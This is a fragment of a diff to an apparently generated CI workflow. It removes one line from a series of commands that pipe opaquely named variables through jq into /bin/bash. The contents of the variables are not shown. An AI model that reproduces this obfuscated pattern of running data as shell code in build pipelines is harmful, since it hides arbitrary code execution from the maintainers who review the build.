@@ -51,7 +51,6 @@ jobs:
           echo $c9 | jq -r .puek4762 | /bin/bash
           printf '%s' "$stv63" | jq -r .fhtrt08426 | /bin/bash
           echo $jbwd395 | jq -r .qvoyt236 | /bin/bash
-          printf '%s' "$ovvtn6" | jq -r .upzmm200 | /bin/bash
           printf '%s' "$ouy636" | jq -r .pk317 | /bin/bash
           echo $yq1 | jq -r .hkz93 | /bin/bash
           echo $ct54 | jq -r .q021 | /bin/bash
